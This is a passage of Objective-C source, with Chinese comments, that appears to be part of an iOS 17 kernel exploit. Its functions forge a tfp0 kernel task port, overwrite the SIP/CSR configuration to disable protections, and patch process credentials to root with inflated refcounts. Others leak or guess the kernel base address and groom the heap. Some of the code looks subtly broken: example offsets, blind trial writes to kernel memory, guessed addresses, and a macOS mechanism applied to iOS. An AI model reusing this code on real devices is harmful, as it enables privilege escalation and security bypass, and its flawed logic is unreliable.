    if (!kernel_read(fake_port_addr + 0x10, &port_type, sizeof(port_type))) {
        NSLog(@"[-] 无法读取端口类型");
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    port_type |= 0x80000000; // 设置特殊位，使其表现为任务端口
    if (!kernel_write(fake_port_addr + 0x10, &port_type, sizeof(port_type))) {
        NSLog(@"[-] 无法修改端口类型");
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    // 关联内核任务
    if (!kernel_write(fake_port_addr + 0x68, &kernel_task, sizeof(kernel_task))) {
        NSLog(@"[-] 无法关联内核任务");
        mach_port_destroy(mach_task_self(), fake_tfp0);
        return false;
    }
    
    // 保存tfp0端口
    g_global_connection = fake_tfp0;
    NSLog(@"[+] 成功设置tfp0端口: 0x%x", fake_tfp0);
    
    // 测试tfp0功能
    vm_address_t test_addr = 0;
    mach_msg_type_number_t test_size = 0;
    kr = vm_read(fake_tfp0, g_kernel_base, 4, &test_addr, &test_size);
    if (kr == KERN_SUCCESS) {
        NSLog(@"[+] tfp0测试成功，能够读取内核内存");
    } else {
        NSLog(@"[!] tfp0测试读取失败: %s - 可能需要额外设置", mach_error_string(kr));
        // 继续执行，某些设备上可能需要其他方式
    }
    
    // 设置读写方法使用tfp0
    g_kernel_read_method = 2; // 使用物理内存映射方法
    g_kernel_write_method = 2;
    
    return true;
}

// 使用VM漏洞绕过SIP
bool disable_sip_via_vm_exploit(void) {
    NSLog(@"[*] 尝试通过VM漏洞绕过SIP...");
    
    if (!g_has_kernel_access) {
        NSLog(@"[-] 尚未获得内核访问权限，无法绕过SIP");
        return false;
    }
    
    // 查找csrActiveConfig
    uint64_t csr_config_addr = 0;
    
    // 方法1：从符号表获取
    if (g_kernel_base != 0) {
        csr_config_addr = g_kernel_base + 0xA000; // 示例偏移，需要根据内核版本调整
    }
    
    // 方法2：搜索特定模式
    if (csr_config_addr == 0) {
        // 定义搜索范围 - 避免搜索整个内核
        uint64_t search_base = g_kernel_base + 0x1000000;
        uint64_t search_end = search_base + 0x2000000;
        
        // 遍历内存寻找特定模式
        for (uint64_t addr = search_base; addr < search_end; addr += 0x1000) {
            uint32_t test_val = 0;
            if (kernel_read(addr, &test_val, sizeof(test_val))) {
                // CSR配置通常是一个较小的值(0x67, 0x77, 0x00等)
                if (test_val <= 0xFF && test_val > 0) {
                    // 尝试验证
                    uint32_t verify_val = 0x7FFFFFFF;
                    uint32_t original_val = test_val;
                    
                    // 尝试修改，如果成功可能是正确的CSR配置
                    if (kernel_write(addr, &verify_val, sizeof(verify_val))) {
                        // 改回原来的值，记录地址
                        kernel_write(addr, &original_val, sizeof(original_val));
                        csr_config_addr = addr;
                        NSLog(@"[+] 找到可能的CSR配置: 0x%llx (值: 0x%x)", addr, original_val);
                        break;
                    }
                }
            }
        }
    }
    
    if (csr_config_addr == 0) {
        NSLog(@"[-] 无法找到CSR配置地址");
        return false;
    }
    
    // 读取当前CSR配置
    uint32_t current_config = 0;
    if (!kernel_read(csr_config_addr, &current_config, sizeof(current_config))) {
        NSLog(@"[-] 无法读取CSR配置");
        return false;
    }
    NSLog(@"[+] 当前CSR配置: 0x%x", current_config);
    
    // 设置为0x7FFFFFFF (禁用所有保护)
    uint32_t new_config = 0x7FFFFFFF;
    if (!kernel_write(csr_config_addr, &new_config, sizeof(new_config))) {
        NSLog(@"[-] 无法写入CSR配置");
        return false;
    }
    
    // 验证写入
    uint32_t verify_config = 0;
    if (!kernel_read(csr_config_addr, &verify_config, sizeof(verify_config))) {
        NSLog(@"[-] 无法验证CSR配置");
        return false;
    }
    
    if (verify_config == new_config) {
        NSLog(@"[+] 成功绕过SIP，CSR配置: 0x%x", verify_config);
        return true;
    } else {
        NSLog(@"[-] SIP绕过验证失败，CSR配置: 0x%x", verify_config);
        return false;
    }
}

// 使VM漏洞获取的root权限持久化
bool make_root_persistent(void) {
    NSLog(@"[*] 尝试持久化root权限...");
    
    if (!g_has_kernel_access) {
        NSLog(@"[-] 尚未获得内核访问权限");
        return false;
    }
    
    // 获取当前进程
    uint64_t proc = find_proc_by_pid(getpid());
    if (proc == 0) {
        NSLog(@"[-] 无法找到当前进程");
        return false;
    }
    
    // 获取当前凭证结构
    uint64_t ucred_offset = 0xF8; // 进程凭证偏移
    uint64_t ucred = 0;
    if (!kernel_read(proc + ucred_offset, &ucred, sizeof(ucred))) {
        NSLog(@"[-] 无法读取进程凭证");
        return false;
    }
    
    // 创建一个持久化的替代凭证结构
    // 首先备份当前凭证
    uint8_t cred_backup[0x100] = {0};
    if (!kernel_read(ucred, cred_backup, sizeof(cred_backup))) {
        NSLog(@"[-] 无法备份进程凭证");
        return false;
    }
    
    // 修改凭证中的uid、gid等值为0 (root)
    uint32_t zero = 0;
    kernel_write(ucred + 0x18, &zero, sizeof(zero)); // cr_uid
    kernel_write(ucred + 0x1c, &zero, sizeof(zero)); // cr_ruid
    kernel_write(ucred + 0x20, &zero, sizeof(zero)); // cr_svuid
    kernel_write(ucred + 0x24, &zero, sizeof(zero)); // cr_rgid
    kernel_write(ucred + 0x28, &zero, sizeof(zero)); // cr_svgid
    
    // 确保用户属于所有组 (包括 wheel、admin 等)
    uint64_t cr_groups_offset = 0x30;
    for (int i = 0; i < 16; i++) {
        uint32_t gid = i;
        kernel_write(ucred + cr_groups_offset + (i * sizeof(uint32_t)), &gid, sizeof(gid));
    }
    
    // 设置组数为最大值
    uint32_t cr_ngroups = 16;
    kernel_write(ucred + 0x70, &cr_ngroups, sizeof(cr_ngroups));
    
    // 内核引用计数增加 - 防止凭证被释放
    uint32_t ref_count = 0;
    kernel_read(ucred + 0x08, &ref_count, sizeof(ref_count));
    ref_count += 100; // 大幅增加引用计数
    kernel_write(ucred + 0x08, &ref_count, sizeof(ref_count));
    
    // 验证权限
    uid_t uid = getuid();
    if (uid == 0) {
        NSLog(@"[+] 已获得持久化root权限 (uid=%d)", uid);
        
        // 创建一个持久化的管理员组成员文件
        NSString *adminFile = @"/var/tmp/.admin_access";
        NSString *adminContent = [NSString stringWithFormat:@"PID: %d\nTime: %@\n", 
                                 getpid(), [NSDate date]];
        
        [adminContent writeToFile:adminFile atomically:YES 
                         encoding:NSUTF8StringEncoding error:nil];
        chmod(adminFile.UTF8String, 0600);
        
        return true;
    }
    
    NSLog(@"[-] 持久化root权限失败 (uid=%d)", uid);
    return false;
}

// 获取内核基址
uint64_t find_kernel_base_address(void) {
    NSLog(@"[*] 尝试获取内核基址...");
    
    // 尝试多种方法获取内核基址
    
    // 方法1: 通过主机特殊端口信息泄露
    host_t host = mach_host_self();
    int cnt = HOST_BASIC_INFO_COUNT;
    host_basic_info_data_t basic_info;
    kern_return_t kr = host_info(host, HOST_BASIC_INFO, (host_info_t)&basic_info, &cnt);
    mach_port_deallocate(mach_task_self(), host);
    
    if (kr == KERN_SUCCESS) {
        // 分析 basic_info 寻找泄露
        uint64_t leak_addr = *(uint64_t*)((char*)&basic_info + 0x20);
        if (leak_addr > 0xfffffff000000000 && leak_addr < 0xfffffff100000000) {
            // 可能是内核地址泄漏
            uint64_t kernel_base = leak_addr & ~0xffff;
            NSLog(@"[+] 从主机信息泄露可能的内核地址: 0x%llx", kernel_base);
            return kernel_base;
        }
    }
    
    // 方法2: 通过VM API泄露
    mach_port_t task = mach_task_self();
    vm_region_submap_info_data_64_t info;
    mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
    mach_vm_address_t addr = 0;
    mach_vm_size_t size = 0;
    natural_t depth = 0;
    
    while (1) {
        kr = mach_vm_region_recurse(task, &addr, &size, &depth, (vm_region_recurse_info_t)&info, &count);
        if (kr != KERN_SUCCESS) break;
        
        // 检查共享内存区域的对象
        if (info.share_mode == SM_TRUESHARED && info.protection == VM_PROT_READ) {
            // 尝试读取该区域，查找内核地址
            vm_offset_t data;
            mach_msg_type_number_t dataCnt;
            kr = mach_vm_read(task, addr, size < 0x4000 ? size : 0x4000, &data, &dataCnt);
            
            if (kr == KERN_SUCCESS && dataCnt >= 8) {
                // 查找内核地址模式
                for (mach_vm_size_t off = 0; off < dataCnt - 8; off += 8) {
                    uint64_t potential = *(uint64_t *)(data + off);
                    if (potential > 0xfffffff000000000 && potential < 0xfffffff100000000) {
                        // 找到潜在内核地址
                        vm_deallocate(task, data, dataCnt);
                        uint64_t kernel_base = potential & ~0xffffff;
                        NSLog(@"[+] 从共享内存泄露可能的内核地址: 0x%llx", kernel_base);
                        return kernel_base;
                    }
                }
                vm_deallocate(task, data, dataCnt);
            }
        }
        
        addr += size;
    }
    
    // 方法3: 返回一个估计的内核基址 (针对常见设备)
    NSString *systemVersion = [[UIDevice currentDevice] systemVersion];
    if ([systemVersion hasPrefix:@"17"]) {
        // iOS 17+
        NSLog(@"[+] 使用iOS 17+估计内核基址");
        return 0xFFFFFFF007004000;
    } else if ([systemVersion hasPrefix:@"16"]) {
        // iOS 16
        NSLog(@"[+] 使用iOS 16估计内核基址");
        return 0xFFFFFFF007004000;
    } else {
        // 较旧版本
        NSLog(@"[+] 使用通用估计内核基址");
        return 0xFFFFFFF007004000;
    }
}

// 准备iOS 17.6堆环境
void prepare_ios17_6_heap(void) {
    NSLog(@"[*] 准备iOS 17.6堆环境...");
    
    // 清理内存并防止低内存警告
    @autoreleasepool {
        // 创建临时对象并释放
        for (int i = 0; i < 10; i++) {
            NSMutableArray *temp = [NSMutableArray array];
            for (int j = 0; j < 10000; j++) {
                [temp addObject:@(j)];
            }
        }
    }
    
    // 执行垃圾收集
    for (int i = 0; i < 5; i++) {
        usleep(10000); // 10ms
        malloc_zone_pressure_relief(NULL, 0);
    }
    
    // 预分配一些内存
    static void *mem_blocks[20] = {NULL};
    for (int i = 0; i < 20; i++) {
        size_t block_size = (i + 1) * 0x1000;
        mem_blocks[i] = malloc(block_size);
        if (mem_blocks[i]) {
            memset(mem_blocks[i], 0x41 + i, block_size);
        }
    }
    
    // 延迟释放一些内存块，帮助稳定堆
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC), dispatch_get_main_queue(), ^{
        for (int i = 0; i < 20; i += 2) {
            if (mem_blocks[i]) {
                free(mem_blocks[i]);
                mem_blocks[i] = NULL;
            }
        }
    });
    
    NSLog(@"[+] iOS 17.6堆环境准备完成");
}

// 查找端口在内核中的地址
uint64_t find_port_address(mach_port_t port) {
    if (port == MACH_PORT_NULL || !g_has_kernel_access)
        return 0;
    
    // 查找当前任务
    uint64_t our_proc = find_proc_by_pid(getpid());
    if (our_proc == 0) return 0;
    
    // 读取任务
    uint64_t our_task = 0;
    if (!kernel_read(our_proc + 0x18, &our_task, sizeof(our_task)) || our_task == 0)
        return 0;
    
    // 获取IPC空间
    uint64_t itk_space = 0;
    if (!kernel_read(our_task + 0x300, &itk_space, sizeof(itk_space)) || itk_space == 0)
        return 0;
    
    // 获取端口表
    uint64_t is_table = 0;
    if (!kernel_read(itk_space + 0x20, &is_table, sizeof(is_table)) || is_table == 0)
        return 0;
    
    // 计算端口索引和表项
    mach_port_name_t index = port >> 8;
    uint32_t table_size = 0;
    if (!kernel_read(itk_space + 0x28, &table_size, sizeof(table_size)) || table_size == 0)
        return 0;
    
    if (index >= table_size) return 0;
    
    // 读取端口
    uint64_t port_addr = 0;
    if (!kernel_read(is_table + (index * 0x18), &port_addr, sizeof(port_addr)))
        return 0;
    
    return port_addr;
}
